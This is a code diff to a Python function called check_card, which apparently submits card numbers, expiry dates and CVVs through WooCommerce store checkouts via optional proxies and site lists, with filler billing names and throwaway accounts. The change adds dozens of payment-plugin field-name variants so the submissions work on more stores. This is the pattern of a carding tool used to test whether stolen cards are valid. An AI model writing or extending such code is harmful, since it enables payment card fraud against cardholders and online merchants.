@@ -645,6 +645,9 @@ def check_card(card_input, proxy=None, sites=None):
             price = price_match.group(1)
         
         # Step 4: Submit checkout
+        # Build dynamic field names based on selected payment method
+        pm = selected_payment_method  # shorthand
+        
         checkout_data = {
             'billing_first_name': fname,
             'billing_last_name': lname,
@@ -660,16 +663,52 @@ def check_card(card_input, proxy=None, sites=None):
             'account_username': username,
             'account_password': lname,
             'payment_method': selected_payment_method,
-            # PayPal Pro fields
+            
+            # Dynamic fields based on selected payment method
+            # WooCommerce standard format: {payment_method}-card-{field}
+            f'{pm}-card-number': cc,
+            f'{pm}-card-expiry': f"{mes_with_zero} / {ano_short}",
+            f'{pm}-card-cvc': cvv,
+            
+            # Underscore format: {payment_method}_card_{field}
+            f'{pm}_card_number': cc,
+            f'{pm}_card_expiry': f"{mes_with_zero} / {ano_short}",
+            f'{pm}_card_cvc': cvv,
+            
+            # Separate month/year fields (2-digit year)
+            f'{pm}_card_expiration_month': mes_with_zero,
+            f'{pm}_card_expiration_year': ano_short,
+            f'{pm}_card_exp_month': mes_with_zero,
+            f'{pm}_card_exp_year': ano_short,
+            
+            # Separate month/year fields (4-digit year) - some plugins need this
+            f'{pm}_card_expiry_month': mes_with_zero,
+            f'{pm}_card_expiry_year': ano_full,
+            
+            # Angelleye PayPal Pro specific fields
+            'paypal_pro_card_number': cc,
+            'paypal_pro_card_cvc': cvv,
+            'paypal_pro_card_expdate_month': mes_with_zero,
+            'paypal_pro_card_expdate_year': ano_full,
+            
+            # PayPal Pro fields - all variations
             'paypal_pro-card-number': cc,
             'paypal_pro-card-expiry': f"{mes_with_zero} / {ano_short}",
-            'paypal_pro_card_expiration_month': mes_no_zero,
-            'paypal_pro_card_expiration_year': ano_short,
             'paypal_pro-card-cvc': cvv,
+            'paypal_pro_card_expiration_month': mes_with_zero,
+            'paypal_pro_card_expiration_year': ano_full,
+            'paypal_pro_card_exp_month': mes_with_zero,
+            'paypal_pro_card_exp_year': ano_full,
+            
             # WPG PayPal Pro fields
             'wpg_paypal_pro-card-number': cc,
             'wpg_paypal_pro-card-expiry': f"{mes_with_zero} / {ano_short}",
             'wpg_paypal_pro-card-cvc': cvv,
+            'wpg_paypal_pro_card_number': cc,
+            'wpg_paypal_pro_card_expiry_month': mes_with_zero,
+            'wpg_paypal_pro_card_expiry_year': ano_full,
+            'wpg_paypal_pro_card_cvc': cvv,
+            
             # PayPal Pro Payflow fields
             'wpg_paypal_pro_payflow-card-number': cc,
             'wpg_paypal_pro_payflow-card-expiry': f"{mes_with_zero} / {ano_short}",
@@ -679,9 +718,30 @@ def check_card(card_input, proxy=None, sites=None):
             'paypal_pro_payflow-card-number': cc,
             'paypal_pro_payflow-card-expiry': f"{mes_with_zero} / {ano_short}",
             'paypal_pro_payflow-card-cvc': cvv,
+            'paypal_pro_payflow_card_number': cc,
+            'paypal_pro_payflow_card_exp_month': mes_with_zero,
+            'paypal_pro_payflow_card_exp_year': ano_full,
+            'paypal_pro_payflow_card_cvc': cvv,
             'paypalpropayflow-card-number': cc,
-            'paypalpropayflow-card-expiry': f"{mes_no_zero} / {ano_full}",
+            'paypalpropayflow-card-expiry': f"{mes_with_zero} / {ano_full}",
             'paypalpropayflow-card-cvc': cvv,
+            
+            # Generic credit card fields that some themes use
+            'card_number': cc,
+            'card_exp_month': mes_with_zero,
+            'card_exp_year': ano_full,
+            'card_cvc': cvv,
+            
+            # EXPDATE formats used by PayPal API directly
+            'expdate': f"{mes_with_zero}{ano_full}",  # MMYYYY
+            'EXPDATE': f"{mes_with_zero}{ano_full}",  # MMYYYY uppercase
+            'exp_date': f"{mes_with_zero}/{ano_short}",  # MM/YY
+            
+            # Credit card type
+            'card_type': ctype,
+            'creditcardtype': ctype,
+            f'{pm}_card_type': ctype,
+            
             'terms': 'on',
             'terms-field': '1',
             '_wpnonce': nonce or '',
